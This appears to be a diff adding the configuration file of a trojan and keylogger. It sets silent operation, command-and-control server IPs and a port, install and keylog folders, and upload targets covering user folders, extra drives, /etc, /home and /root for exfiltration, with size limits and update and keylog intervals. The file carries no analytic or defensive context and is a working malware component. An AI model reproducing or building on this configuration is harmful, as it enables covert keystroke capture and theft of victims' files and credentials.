@@ -1,0 +1,12 @@
+MAX_BANNER_LEN  = 1024
+SILENT_MODE     = True
+SERVERS         = ['123.205.110.226', '192.168.0.105']
+PORT            = 50006
+trojan_dirs     = {'Windows': 'C:\\Trojan', 'Linux': '/tmp'}
+keylogger_dirs  = {'Windows': ['C:\\KeyLogger']}
+upload_dirs     = {'Windows': ['C:\\Users', 'D:', 'E:', 'F:'], 'Linux': ['/etc', '/home', '/root']}
+max_size        = 16777216
+max_file        = 0
+update_interval = 3600
+keylog_interval = 3
+save_dir        = {'Windows': 'C:\\temp', 'Linux': '/tmp'}
